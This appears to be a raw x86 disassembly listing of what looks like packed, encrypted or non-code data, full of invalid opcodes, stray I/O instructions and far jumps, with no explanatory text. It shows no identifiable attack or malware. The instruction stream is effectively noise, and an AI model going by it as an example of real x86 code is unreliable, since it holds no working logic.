  41e880:	(bad)  
  41e881:	or     ebx,DWORD PTR [eax-0x43]
  41e884:	imul   edx,DWORD PTR [eax+0x2f],0x703af706
  41e88b:	pop    esi
  41e88c:	xor    BYTE PTR [edx-0x49135005],dl
  41e892:	sti    
  41e893:	lods   al,BYTE PTR ds:[esi]
  41e894:	dec    edi
  41e895:	fbstp  TBYTE PTR [eax]
  41e897:	mov    esi,DWORD PTR [ecx]
  41e899:	mov    eax,ds:0xabcb9079
  41e89e:	sub    ebp,esi
  41e8a0:	adc    al,BYTE PTR [eax]
  41e8a2:	pusha  
  41e8a3:	fdivrp st(6),st
  41e8a5:	jecxz  0x41e84a
  41e8a7:	dec    ebx
  41e8a8:	lea    ebx,[eax]
  41e8aa:	sbb    edi,DWORD PTR [eax]
  41e8ac:	jle    0x41e8ae
  41e8ae:	sub    eax,0x61f39906
  41e8b3:	mov    edx,0x43989e13
  41e8b8:	sar    BYTE PTR [ebx-0x16],0xfa
  41e8bc:	or     al,BYTE PTR [ebx]
  41e8be:	shr    DWORD PTR [ebx+0x770805f9],cl
  41e8c4:	(bad)
  41e8c7:	adc    BYTE PTR [ebp+0x54],dh
  41e8ca:	fcmovnu st,st(0)
  41e8cc:	daa    
  41e8cd:	adc    eax,0x6b5cfd94
  41e8d2:	pop    es
  41e8d3:	nop
  41e8d4:	adc    eax,0xd69ebd5
  41e8d9:	ret    0x7b08
  41e8dc:	(bad)  
  41e8dd:	pop    edx
  41e8de:	idiv   DWORD PTR [ebx-0x50]
  41e8e1:	xchg   edx,eax
  41e8e2:	(bad)  
  41e8e3:	jmp    0x41e870
  41e8e5:	and    eax,0xe7ff3d4
  41e8ea:	adc    eax,0xd2210b31
  41e8ef:	mov    bl,0xf5
  41e8f1:	push   edx
  41e8f2:	mov    bh,0xa6
  41e8f4:	clc    
  41e8f5:	lock inc eax
  41e8f7:	add    DWORD PTR [ebx],edi
  41e8f9:	hlt    
  41e8fa:	cwde   
  41e8fb:	jno    0x41e90d
  41e8fd:	in     al,dx
  41e8fe:	out    0xbb,eax
  41e900:	push   ss
  41e901:	adc    eax,0xb53189fb
  41e906:	lods   eax,DWORD PTR ds:[esi]
  41e907:	out    0xf9,eax
  41e909:	inc    ecx
  41e90a:	mov    ebp,0xcc1a376f
  41e90f:	call   0x3c8f:0x475b0754
  41e916:	xlat   BYTE PTR ds:[ebx]
  41e917:	xor    ch,BYTE PTR [edx]
  41e919:	mul    cl
  41e91b:	js     0x41e8d1
  41e91d:	push   edi
  41e91e:	mov    al,0xc4
  41e920:	pop    ecx
  41e921:	(bad)
  41e924:	mov    BYTE PTR [edi+ebp*1-0x55],bh
  41e928:	fwait
  41e929:	loopne 0x41e921
  41e92b:	sbb    DWORD PTR [ebx-0x3c86e97c],edx
  41e931:	xor    eax,0x68503d5c
  41e936:	jne    0x41e92b
  41e938:	dec    eax
  41e939:	sbb    al,BYTE PTR [esi]
  41e93b:	xchg   ebp,eax
  41e93c:	gs pop esp
  41e93e:	xchg   edi,eax
  41e93f:	in     eax,0x55
  41e941:	inc    esp
  41e942:	call   0xb3bf:0xe07e04ba
  41e949:	mov    ds:0x5ff76041,al
  41e94e:	cmp    DWORD PTR [ebp-0x3f969d41],0x9f17ae1
  41e958:	(bad)  
  41e959:	fsubr  DWORD PTR [ebp+0x3]
  41e95c:	ret    0xdd38
  41e95f:	and    ah,BYTE PTR [edx+0x6]
  41e962:	push   edx
  41e963:	mul    BYTE PTR [esi]
  41e965:	sbb    eax,0xbcc5875
  41e96a:	test   DWORD PTR [ebp-0x31f41d13],esp
  41e970:	cwde   
  41e971:	and    BYTE PTR [edx],0x98
  41e974:	and    BYTE PTR [ebp-0x3],ah
  41e977:	scas   al,BYTE PTR es:[edi]
  41e978:	xchg   esi,eax
  41e979:	push   edi
  41e97a:	jae    0x41e915
  41e97c:	loopne 0x41e9b6
  41e97e:	cmp    bl,ch
  41e980:	sub    eax,0xcae7773f
  41e985:	push   ds
  41e986:	pop    ebp
  41e987:	in     eax,dx
  41e988:	push   ebx
  41e989:	retf   
  41e98a:	cmp    ebp,DWORD PTR [edi]
  41e98c:	clc    
  41e98d:	pop    esi
  41e98e:	and    eax,0x3ddaf479
  41e993:	mov    al,ds:0xbd534836
  41e998:	jl     0x41e9fd
  41e99a:	xchg   ebp,eax
  41e99b:	outs   dx,DWORD PTR ds:[esi]
  41e99c:	in     al,dx
  41e99d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e99e:	pop    ebp
  41e99f:	push   0x3b2893a9
  41e9a4:	mul    DWORD PTR [edi+0x4699d4aa]
  41e9aa:	iret   
  41e9ab:	adc    BYTE PTR [edx+0x33],cl
  41e9ae:	cmc    
  41e9af:	or     ah,BYTE PTR [eax]
  41e9b1:	sub    eax,0xb75bb0c1
  41e9b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9b7:	repz iret 
  41e9b9:	mov    al,ds:0x70eee386
  41e9be:	mov    ecx,0xc6fb87cc
  41e9c3:	ror    DWORD PTR [eax-0x49],1
  41e9c6:	adc    al,al
  41e9c8:	fimul  DWORD PTR [eax+0x513b4b3f]
  41e9ce:	test   BYTE PTR [ecx+0x5c],bh
  41e9d1:	std    
  41e9d2:	xor    DWORD PTR [ecx],esi
  41e9d4:	mov    ch,0x1a
  41e9d6:	and    eax,DWORD PTR [esi-0x2b725875]
  41e9dc:	sar    ecx,cl
  41e9de:	inc    ecx
  41e9df:	out    0x2b,al
  41e9e1:	ret    0x8b13
  41e9e4:	fidiv  DWORD PTR [eax+ebp*4]
  41e9e7:	arpl   WORD PTR [esi-0x5f],ax
  41e9ea:	out    dx,eax
  41e9eb:	imul   esp,DWORD PTR [edi-0x2b],0x6524eb70
  41e9f2:	hlt    
  41e9f3:	in     al,dx
  41e9f4:	push   edx
  41e9f5:	lea    ebx,[ebx-0x75]
  41e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9f9:	cs xor eax,0x214b1e35
  41e9ff:	mov    BYTE PTR [edi+0x36],bh
  41ea02:	ja     0x41ea7d
  41ea04:	or     eax,0x3de02fa9
  41ea09:	es popf 
  41ea0b:	push   esp
  41ea0c:	lds    ecx,FWORD PTR [ebp-0x1c51a91c]
  41ea12:	ror    BYTE PTR [edi-0x540c01b7],0x31
  41ea19:	stos   BYTE PTR es:[edi],al
  41ea1a:	test   al,0x5a
  41ea1c:	xor    ch,BYTE PTR [edx]
  41ea1e:	add    DWORD PTR [esi],ebp
  41ea20:	adc    ebx,DWORD PTR [edi+0xf]
  41ea23:	or     ah,BYTE PTR [edi+0x28ba07dc]
  41ea29:	inc    esp
  41ea2a:	das    
  41ea2b:	jnp    0x41ea06
  41ea2d:	ins    BYTE PTR es:[edi],dx
  41ea2e:	jle    0x41ea11
  41ea30:	adc    eax,0xb2095c74
  41ea35:	lods   al,BYTE PTR ds:[esi]
  41ea36:	lock (bad) 
  41ea39:	pusha  
  41ea3a:	das    
  41ea3b:	repz cmp DWORD PTR [edx],edx
  41ea3e:	cli    
  41ea3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea40:	stos   DWORD PTR es:[edi],eax
  41ea41:	adc    eax,0x27723fe1
  41ea46:	je     0x41eabf
  41ea48:	mov    esi,0xbeaa9724
  41ea4d:	mov    eax,0x88b9cbe5
  41ea52:	dec    edi
  41ea53:	cmp    ebp,DWORD PTR [ecx]
  41ea55:	ja     0x41ea25
  41ea57:	dec    edi
  41ea58:	push   0xeba19c02
  41ea5d:	inc    edx
  41ea5e:	in     al,dx
  41ea5f:	and    cl,BYTE PTR [eax-0x30]
  41ea62:	popf   
  41ea63:	mov    dl,0xe2
  41ea65:	mov    cl,BYTE PTR [ebx-0x39]
  41ea68:	mov    bh,BYTE PTR [esi-0x10]
  41ea6b:	ins    DWORD PTR es:[edi],dx
  41ea6c:	(bad)  
  41ea6d:	fdivp  st(4),st
  41ea6f:	std    
  41ea70:	int3   
  41ea71:	rol    DWORD PTR [ecx+0x7c2f4415],cl
  41ea77:	(bad)  [ebx*4+0x2f70faec]
  41ea7e:	pop    edx
  41ea7f:	icebp  
  41ea80:	cmp    eax,0x79db668e
  41ea85:	xor    DWORD PTR [eax],esp
  41ea87:	loop   0x41eabd
  41ea89:	icebp  
  41ea8a:	push   edi
  41ea8b:	lods   al,BYTE PTR ds:[esi]
  41ea8c:	push   esi
  41ea8d:	imul   ecx,DWORD PTR [ebp+ebx*8-0x73556d31],0x477b8482
  41ea98:	lock xor BYTE PTR [esi-0x12ebcebe],bl
  41ea9f:	rcl    DWORD PTR [esi],cl
  41eaa1:	cmp    eax,0x9047
	...
  41eaae:	add    BYTE PTR [eax],al
  41eab0:	add    BYTE PTR [esi-0x3e],bh
  41eab3:	in     al,dx
  41eab4:	push   cs
  41eab5:	cld    
  41eab6:	cs (bad) 
  41eab8:	repnz lods eax,DWORD PTR ds:[esi]
  41eaba:	add    BYTE PTR [eax],bl
  41eabc:	xor    al,0x48
  41eabe:	fwait
  41eabf:	or     al,0xe2
  41eac1:	shl    DWORD PTR [ebp+0x1],0x0
  41eac5:	stos   DWORD PTR es:[edi],eax
  41eac6:	add    eax,DWORD PTR [eax]
  41eac8:	add    BYTE PTR [esi-0x2a8961f4],cl
  41eace:	test   DWORD PTR ss:[edx],edi
  41ead1:	jge    0x41eaf1
  41ead3:	cs mov dh,0x4f
  41ead6:	and    DWORD PTR [edx+ebp*4+0x6a],ebp
  41eada:	sti    
  41eadb:	popa   
  41eadc:	stos   DWORD PTR es:[edi],eax
  41eadd:	jl     0x41eb3e
  41eadf:	lds    esp,FWORD PTR [edx]
  41eae1:	in     al,dx
  41eae2:	jmp    0x41eaaa
  41eae4:	lods   eax,DWORD PTR ds:[esi]
  41eae5:	or     ecx,ebx
  41eae7:	arpl   WORD PTR [edi+0x1da0f600],cx
  41eaed:	cmp    DWORD PTR [edi-0x7d],ebx
  41eaf0:	test   al,0xc6
  41eaf2:	push   0xc7981a8
  41eaf7:	push   eax
  41eaf8:	xlat   BYTE PTR ds:[ebx]
  41eaf9:	adc    DWORD PTR [ecx-0x12],ebx
  41eafc:	sub    DWORD PTR cs:[ebp+edx*4-0x7ceff4ae],ebx
  41eb04:	cmp    ah,BYTE PTR [ebp+eax*2+0x5a]
  41eb08:	adc    eax,0xaf4699ac
  41eb0d:	xchg   ebx,eax
  41eb0e:	cmp    BYTE PTR [ebp+ecx*8+0x11],0x72
  41eb13:	cdq    
  41eb14:	jp     0x41eb3c
  41eb16:	pop    esi
  41eb17:	fadd   DWORD PTR ds:0xc779ed4f
  41eb1d:	lods   al,BYTE PTR ds:[esi]
  41eb1e:	popa   
  41eb1f:	iret   
  41eb20:	pop    ebp
  41eb21:	inc    ebx
  41eb22:	pop    ecx
  41eb23:	sub    BYTE PTR [ebx+ebx*8+0x9],bl
  41eb27:	sbb    al,0x24
  41eb29:	xchg   ebp,eax
  41eb2a:	lock jmp 0xc2a7:0x12c8ed0e
  41eb32:	lods   eax,DWORD PTR ds:[esi]
  41eb33:	lea    ebx,[ecx-0x45]
  41eb36:	cmp    DWORD PTR [esi+0x5dd64195],0x17
  41eb3d:	push   cs
  41eb3e:	in     eax,dx
  41eb3f:	fnsave [ecx+0x26]
  41eb42:	repz inc edx
  41eb44:	push   ss
  41eb45:	push   0xffffffcd
  41eb47:	ret    0xc77f
  41eb4a:	add    DWORD PTR [esi+0x3d7ae7bb],esp
  41eb50:	add    DWORD PTR [edx-0xb],edx
  41eb53:	jecxz  0x41eb99
  41eb55:	push   ss
  41eb56:	or     BYTE PTR [ebx-0x676e0538],ch
  41eb5c:	mov    bh,BYTE PTR [edx+0x1dc9cdb0]
  41eb62:	enter  0x39b,0x26
  41eb66:	dec    ebx
  41eb67:	and    dh,BYTE PTR [edi-0x2c9500fb]
  41eb6d:	jmp    0x1832:0x8d73eb82
  41eb74:	inc    esi
  41eb75:	test   al,0xd0
  41eb77:	sbb    DWORD PTR [eax],edi
  41eb79:	dec    ebp
  41eb7a:	cmp    ecx,DWORD PTR [esi+0x17d581e]
  41eb80:	push   ebx
  41eb81:	jb     0x41eb17
  41eb83:	xlat   BYTE PTR ds:[ebx]
  41eb84:	push   esi
  41eb85:	pop    es
  41eb86:	loopne 0x41ebf2
  41eb88:	out    dx,al
  41eb89:	sbb    al,0x89
  41eb8b:	cmp    al,0x11
  41eb8d:	cmp    al,0x67
  41eb8f:	fisub  WORD PTR [esi-0x7]
  41eb92:	pop    esp
  41eb93:	mov    dl,0x15
  41eb95:	stos   DWORD PTR es:[edi],eax
  41eb96:	fdiv   QWORD PTR [ebx+0x1e]
  41eb99:	jg     0x41eb32
  41eb9b:	or     eax,0x8dc50400
  41eba0:	retf   
  41eba1:	(bad)  
  41eba2:	je     0x41eb5c
  41eba4:	dec    eax
  41eba5:	das    
  41eba6:	xchg   ecx,eax
  41eba7:	mov    bh,0x9e
  41eba9:	push   ecx
  41ebaa:	jmp    0x6994:0xa237ac11
  41ebb1:	add    DWORD PTR [ebx-0x20ee009b],ebx
  41ebb7:	or     eax,0x19fbb34b
  41ebbc:	cmp    al,0x7f
  41ebbe:	pop    ss
  41ebbf:	dec    BYTE PTR ds:0x39bccaa6
  41ebc5:	mov    ebx,DWORD PTR [eax-0xf]
  41ebc8:	sti    
  41ebc9:	int    0xa4
  41ebcb:	loop   0x41eb56
  41ebcd:	ss ss adc eax,0xd2d14eab
  41ebd4:	cmp    ebx,DWORD PTR [ecx+edi*2]
  41ebd7:	stc    
  41ebd8:	call   FWORD PTR ds:[edi-0x1c204cfd]
  41ebdf:	fidiv  DWORD PTR [ebp-0x5e]
  41ebe2:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41ebe4:	xchg   BYTE PTR [ebp+ebx*4-0x61],cl
  41ebe8:	xor    ebp,DWORD PTR [edi+edi*2+0x40b044f5]
  41ebef:	sahf   
  41ebf0:	shr    ebx,0x7a
  41ebf3:	dec    eax
  41ebf4:	in     eax,0x83
  41ebf6:	inc    esp
  41ebf7:	xor    dh,BYTE PTR [ecx-0x2505e3c2]
  41ebfd:	inc    ecx
  41ebfe:	(bad)  
  41ebff:	adc    DWORD PTR [ecx-0x285c9340],eax
  41ec05:	mov    bl,0x34
  41ec07:	hlt    
  41ec08:	and    DWORD PTR [edx],esp
  41ec0a:	mov    al,ah
  41ec0c:	and    al,0xa7
  41ec0e:	cdq    
  41ec0f:	nop
  41ec10:	mov    cl,0xa2
  41ec12:	into   
  41ec13:	int    0x20
  41ec15:	je     0x41ebbc
  41ec17:	push   0x2d
  41ec19:	in     al,0x2d
  41ec1b:	adc    eax,0x495462d0
  41ec20:	xchg   edi,eax
  41ec21:	xor    eax,0xd8fa1b82
  41ec26:	aaa    
  41ec27:	mov    ds:0x7107ef0a,eax
  41ec2c:	pop    edi
  41ec2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec2e:	and    eax,0x7b382ae4
  41ec33:	fiadd  WORD PTR [ecx+0x65]
  41ec36:	xchg   ebp,eax
  41ec37:	arpl   WORD PTR [ecx+0x61],bp
  41ec3a:	or     BYTE PTR [ecx+0x60],bl
  41ec3d:	inc    edx
  41ec3e:	xor    esp,edi
  41ec40:	and    ch,BYTE PTR [ebp+0x12f1977]
  41ec46:	js     0x41ec21
  41ec48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec49:	push   0xffffffb2
  41ec4b:	xor    BYTE PTR [edi],cl
  41ec4d:	(bad)  
  41ec4e:	adc    BYTE PTR cs:[esi-0x137d7524],0xb6
  41ec56:	jbe    0x41eca0
  41ec58:	loop   0x41ebfa
  41ec5a:	inc    eax
  41ec5b:	mov    BYTE PTR [edi+edx*4],bl
  41ec5e:	cmp    eax,0x1100cf29
  41ec63:	inc    esi
  41ec64:	xchg   edi,eax
  41ec65:	iret   
  41ec66:	mov    ds:0xb1edf664,al
  41ec6b:	sbb    dl,0xb5
  41ec6e:	outs   dx,BYTE PTR ds:[esi]
  41ec70:	cmp    al,0x2e
  41ec72:	imul   esp,esp,0xb8efd08a
  41ec78:	mov    edx,0xc09ed07e
  41ec7d:	cdq    
  41ec7e:	inc    ebp
  41ec7f:	cld    
  41ec80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec81:	jo     0x41ec64
  41ec83:	sub    BYTE PTR [ecx-0xdff0152],dl
  41ec89:	sub    BYTE PTR [edx-0x64f2018],ch
  41ec8f:	mov    al,0x91
  41ec91:	int3   
  41ec92:	mov    ecx,0xa6fb55e0
  41ec97:	jb     0x41ec8f
  41ec99:	rcl    BYTE PTR [edi+0x17],1
  41ec9c:	stos   DWORD PTR es:[edi],eax
  41ec9d:	leave  
  41ec9e:	sar    DWORD PTR [edi+0x6],0xd1
  41eca2:	jns    0x41ecc7
  41eca4:	(bad)  
  41eca6:	push   esp
  41eca7:	rcl    BYTE PTR [ecx+0x8],1
  41ecaa:	(bad)  
  41ecab:	mov    esi,0x60b2db29
  41ecb0:	cwde   
  41ecb1:	shl    BYTE PTR [ebx],cl
  41ecb3:	mov    esp,0xa9c1166
  41ecb8:	mov    bh,0xc5
  41ecba:	pusha  
  41ecbb:	xchg   BYTE PTR [ebx+0x37],bh
  41ecbe:	sbb    eax,0x59b51f87
  41ecc3:	add    ah,BYTE PTR [ecx-0x6605e94]
  41ecc9:	cmp    eax,0x46497294
  41ecce:	(bad)  
  41ecd0:	mov    al,0xa3
  41ecd2:	inc    edx
  41ecd3:	pop    esi
  41ecd4:	cmp    eax,0xdecb7c81
  41ecd9:	or     BYTE PTR [ebx],al
  41ecdb:	add    al,0xef
  41ecdd:	xchg   ebx,eax
  41ecde:	mov    bh,0x7e
  41ece0:	push   ds
  41ece1:	or     al,0xc2
  41ece3:	sub    al,0xb3
  41ece5:	clc    
  41ece6:	addr16 dec eax
  41ece8:	pop    edi
  41ece9:	fisttp QWORD PTR [edx]
  41eceb:	out    0xe7,eax
  41eced:	adc    DWORD PTR [edi+0x4e],esp
  41ecf0:	jae    0x41ecaf
  41ecf2:	in     eax,0xf9
  41ecf4:	fldl2e 
  41ecf6:	inc    edx
  41ecf7:	lds    edx,FWORD PTR [edx]
  41ecf9:	mov    ch,0x99
  41ecfb:	pop    edi
  41ecfc:	rol    dl,cl
  41ecfe:	pop    ebx
  41ecff:	loopne 0x41ecc6
  41ed01:	outs   dx,DWORD PTR ds:[esi]
  41ed02:	in     al,0xdd
  41ed04:	inc    ecx
  41ed05:	mov    esi,0x90398ccd
  41ed0a:	cdq    
  41ed0b:	shl    al,cl
  41ed0d:	lds    ebp,FWORD PTR [ecx+edi*2]
  41ed10:	dec    bx
  41ed12:	cli    
  41ed13:	push   ss
  41ed14:	and    al,0xa9
  41ed16:	push   edx
  41ed17:	xchg   esi,eax
  41ed18:	leave  
  41ed19:	(bad)  
  41ed1a:	mov    ds:0xddc45d5a,eax
  41ed1f:	push   esi
  41ed20:	ds jl  0x41ed96
  41ed23:	xor    DWORD PTR [edi+0x28],ecx
  41ed26:	and    bh,BYTE PTR [esi-0x80]
  41ed29:	lds    ebp,FWORD PTR [edx]
  41ed2b:	cmp    al,0x8e
  41ed2d:	loope  0x41eda2
  41ed2f:	inc    ebx
  41ed30:	mov    bl,0x82
  41ed32:	adc    BYTE PTR [edx+0x6d],dh
  41ed35:	fcomp  st(6)
  41ed37:	fld    TBYTE PTR [eax+0x4e]
  41ed3a:	mov    bl,0xf2
  41ed3c:	sbb    BYTE PTR [ebx],cl
  41ed3e:	fimul  DWORD PTR [ebp-0x58edfea2]
  41ed44:	clc    
  41ed45:	mov    bh,0xd5
  41ed47:	cli    
  41ed48:	cdq    
  41ed49:	stc    
  41ed4a:	push   cs
  41ed4b:	cdq    
  41ed4c:	mov    al,0x43
  41ed4e:	pop    edx
  41ed4f:	mov    ?,WORD PTR [esi-0x27e88e75]
  41ed55:	and    al,0xb
  41ed57:	jne    0x41eda7
  41ed59:	stos   DWORD PTR es:[edi],eax
  41ed5a:	add    DWORD PTR [edi+0x33],eax
  41ed5d:	lahf   
  41ed5e:	std    
  41ed5f:	stc    
  41ed60:	cld    
  41ed61:	inc    ebx
  41ed62:	xor    al,0x2b
  41ed64:	out    dx,al
  41ed65:	inc    ecx
  41ed66:	sbb    BYTE PTR [eax],ah
  41ed68:	mov    al,0xd6
  41ed6a:	cmp    BYTE PTR [edi-0x4b66cac7],bh
  41ed70:	dec    edi
  41ed71:	sub    eax,0x67ee2249
  41ed76:	jnp    0x41edba
  41ed78:	lods   eax,DWORD PTR ds:[esi]
  41ed79:	jp     0x41edcb
  41ed7b:	adc    DWORD PTR [ebp-0x5],eax
  41ed7e:	cmp    eax,0xe0099271
  41ed83:	inc    ecx
  41ed84:	mov    edx,0x55b98632
  41ed89:	outs   dx,DWORD PTR ds:[esi]
  41ed8a:	or     cl,BYTE PTR [ebp-0x42]
  41ed8d:	fisttp WORD PTR [ebp+0x40]
  41ed90:	dec    ebx
  41ed91:	sub    ecx,DWORD PTR [ecx-0x2956e9f1]
  41ed97:	nop
  41ed98:	retf   
  41ed99:	mov    bl,0x86
  41ed9b:	movzx  eax,WORD PTR [esi+0x58747fa2]
  41eda2:	popa   
  41eda3:	pop    ss
  41eda4:	pop    ss
  41eda5:	clc    
  41eda6:	adc    DWORD PTR [eax-0x3],0xfffffff1
  41edaa:	loope  0x41ee13
  41edac:	mov    dl,0xd2
  41edae:	ins    BYTE PTR es:[edi],dx
  41edaf:	mov    ecx,0xf60fcfa5
  41edb4:	sub    al,0x1b
  41edb6:	fidivr DWORD PTR [esi-0x52]
  41edb9:	mov    bh,0x89
  41edbb:	cdq    
  41edbc:	adc    BYTE PTR [eax+0x494ebd8f],dl
  41edc2:	cli    
  41edc3:	xchg   ebx,eax
  41edc4:	sbb    eax,ebx
  41edc6:	mov    ch,0x79
  41edc8:	stos   BYTE PTR es:[edi],al
  41edc9:	(bad)  
  41edca:	(bad)  
  41edcb:	cdq    
  41edcc:	popa   
  41edcd:	jge    0x41ed56
  41edcf:	lods   al,BYTE PTR ds:[esi]
  41edd0:	sbb    DWORD PTR [edi],ecx
  41edd2:	sub    eax,0x475400e0
  41edd7:	jp     0x41ee00
  41edd9:	shl    BYTE PTR [ebp+ebp*8+0x5c],cl
  41eddd:	fst    QWORD PTR [ebp-0x4c]
  41ede0:	push   cs
  41ede1:	sub    eax,0xef187a44
  41ede6:	je     0x41ee07
  41ede8:	test   al,0x1e
  41edea:	sub    al,0xd7
  41edec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eded:	frstor [ebp+0x7d]
  41edf0:	(bad)  
  41edf1:	jecxz  0x41edc3
  41edf3:	pop    esi
  41edf4:	shl    BYTE PTR [ecx],0x48
  41edf7:	jno    0x41edcc
  41edf9:	aaa    
  41edfa:	daa    
  41edfb:	cmp    DWORD PTR [edx+ebp*4],ebx
  41edfe:	ror    DWORD PTR [edx+eax*1-0x7fb1b2a1],cl
  41ee05:	add    DWORD PTR [edx+edi*1],eax
  41ee08:	xchg   ebp,eax
  41ee09:	push   ecx
  41ee0a:	pop    ds
  41ee0b:	aaa    
  41ee0c:	in     eax,dx
  41ee0d:	fisttp DWORD PTR [esi]
  41ee0f:	iret   
  41ee10:	imul   BYTE PTR [eax-0x26]
  41ee13:	push   eax
  41ee14:	push   ecx
  41ee15:	inc    ecx
  41ee16:	mov    cl,cl
  41ee18:	cmp    al,0x5
  41ee1a:	(bad)  
  41ee1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee1d:	sub    BYTE PTR [eax],0xb2
  41ee20:	(bad)  
  41ee21:	cld    
  41ee22:	add    al,0x3
  41ee24:	loop   0x41ede7
  41ee26:	fild   WORD PTR ds:0x5cb9a0e6
  41ee2c:	fbstp  TBYTE PTR [edx-0x6d]
  41ee2f:	pop    ebx
  41ee30:	repz cmp eax,0x11c08b43
  41ee36:	inc    esp
  41ee37:	ret    
  41ee38:	jno    0x41eeb6
  41ee3a:	lods   al,BYTE PTR ds:[esi]
  41ee3b:	sahf   
  41ee3c:	repnz aam 0x40
  41ee3f:	cmp    BYTE PTR [esi+0x5d],ah
  41ee42:	push   ebp
  41ee43:	and    edi,DWORD PTR [ebp-0x29]
  41ee46:	(bad)  
  41ee47:	jmp    0x41edd5
  41ee49:	pop    ecx
  41ee4a:	or     ebp,DWORD PTR ds:[edx+0x7d]
  41ee4e:	inc    ebx
  41ee4f:	mov    cl,0xd
  41ee51:	sub    dh,BYTE PTR [ecx+0x4ca032dd]
  41ee57:	dec    edx
  41ee58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee59:	adc    BYTE PTR [eax-0x52],bh
  41ee5c:	jns    0x41ee7b
  41ee5e:	retfw  0xaf96
  41ee62:	and    bh,BYTE PTR ds:[edx-0x40131551]
  41ee69:	outs   dx,BYTE PTR ds:[esi]
  41ee6a:	cs jnp 0x41eed5
  41ee6d:	mov    ch,0xe9
  41ee6f:	mov    ds:0xd33df76c,al
	...
  41ee80:	add    BYTE PTR [esi-0x37],cl
  41ee83:	(bad)  [edi+ebx*8+0x5c]
  41ee87:	(bad)  
  41ee89:	mov    al,ds:0xe82f76e4
  41ee8e:	aad    0x18
  41ee90:	push   0x1696c
  41ee95:	stos   DWORD PTR es:[edi],eax
  41ee96:	add    eax,DWORD PTR [eax]
  41ee98:	add    BYTE PTR [esi+0x6561d452],dh
  41ee9e:	repz (bad) 
  41eea0:	in     eax,dx
  41eea1:	aas    
  41eea2:	sbb    BYTE PTR [edx+0x63fe2033],al
  41eea8:	inc    edi
  41eea9:	mov    dl,0xae
  41eeab:	jo     0x41ef0d
  41eead:	or     eax,0x9948297a
  41eeb2:	push   0x51
  41eeb4:	jle    0x41eec1
  41eeb6:	jae    0x41eec7
  41eeb8:	stos   BYTE PTR es:[edi],al
  41eeb9:	jg     0x41ee89
  41eebb:	std    
  41eebc:	clc    
  41eebd:	inc    esp
  41eebe:	out    dx,eax
  41eebf:	int    0xd5
  41eec1:	sbb    bl,cl
  41eec3:	inc    eax
  41eec4:	jb     0x41eece
  41eec6:	sbb    BYTE PTR [ebx+0x4fb804a4],0x1
  41eecd:	inc    ecx
  41eece:	push   esi
  41eecf:	es inc ecx
  41eed1:	cmp    al,0x97
  41eed3:	pop    ds
  41eed4:	hlt    
  41eed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eed6:	pop    esp
  41eed7:	outs   dx,DWORD PTR ds:[esi]
  41eed8:	loop   0x41ee9d
  41eeda:	mov    edx,0x5029838a
  41eedf:	stos   BYTE PTR es:[edi],al
  41eee0:	and    DWORD PTR [esi+0x333037d0],edi
  41eee6:	pop    ebp
  41eee7:	adc    BYTE PTR [edx-0x32],bl
  41eeea:	push   ecx
  41eeeb:	mov    edx,edi
  41eeed:	clc    
  41eeee:	jmp    DWORD PTR [eax-0x73]
  41eef1:	in     eax,dx
  41eef2:	inc    esi
  41eef3:	imul   edi,DWORD PTR [edx],0xffffffa5
  41eef6:	test   bh,dh
  41eef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eef9:	int3   
  41eefa:	repz sti 
  41eefc:	bound  eax,QWORD PTR [ebx-0x45acc7e2]
  41ef02:	pop    es
  41ef03:	(bad)  
  41ef04:	cmp    cl,ch
  41ef06:	inc    eax
  41ef07:	xor    bl,BYTE PTR [edx-0x1]
  41ef0a:	dec    edi
  41ef0b:	jbe    0x41ef80
  41ef0d:	test   eax,0xa7d9e94
  41ef12:	mov    eax,0x8cdb51cb
  41ef17:	xchg   esi,eax
  41ef18:	aas    
  41ef19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef1a:	jb     0x41eebf
  41ef1c:	ss pop ecx
  41ef1e:	mov    esi,0x6ad6d274
  41ef23:	sub    al,0x6b
  41ef25:	sub    ecx,DWORD PTR [eax-0x25e541dd]
  41ef2b:	loop   0x41ef74
  41ef2d:	sub    ebp,0x5452747c
  41ef33:	scas   eax,DWORD PTR es:[edi]
  41ef34:	xor    BYTE PTR [ecx+0x106c8cc1],ch
  41ef3a:	pop    ebp
  41ef3b:	repnz sar BYTE PTR [ebx+0x394ccbd4],1
  41ef42:	mov    esp,0xc546c9a9
  41ef47:	xor    BYTE PTR [ebp+0x2a6ce057],bh
  41ef4d:	in     al,dx
  41ef4e:	jo     0x41ef10
  41ef50:	sbb    eax,0x5eea42
  41ef55:	ss push edx
  41ef57:	dec    eax
  41ef58:	fld    DWORD PTR [eax+0x3c]
  41ef5b:	ds jns 0x41ef4e
  41ef5e:	adc    ah,bh
  41ef60:	(bad)  
  41ef61:	jne    0x41eeeb
  41ef63:	push   edx
  41ef64:	add    DWORD PTR [ecx-0xb2ac31a],0x0
  41ef6b:	cdq    
  41ef6c:	mov    esi,0xae457b87
  41ef71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef72:	enter  0xe6c8,0x6c
  41ef76:	js     0x41ef57
  41ef78:	push   ebp
  41ef79:	nop
  41ef7a:	and    al,BYTE PTR [eax-0x38bb0139]
  41ef80:	mov    eax,ds:0xbb9460c2
  41ef85:	fcmovnu st,st(5)
  41ef87:	or     ch,BYTE PTR [edx+0x16274fb2]
  41ef8d:	add    eax,esp
  41ef8f:	stc    
  41ef90:	or     al,0x9c
  41ef92:	inc    edx
  41ef93:	adc    al,0x3a
  41ef95:	pop    ecx
  41ef96:	les    eax,FWORD PTR [ebp+0xf2c9f2a]
  41ef9c:	imul   dh
  41ef9e:	cli    
  41ef9f:	sti    
  41efa0:	pop    ebp
  41efa1:	and    ah,ch
  41efa3:	xchg   DWORD PTR [edi],ebp
  41efa5:	and    al,bl
  41efa7:	or     DWORD PTR [edx+0x2a],esi
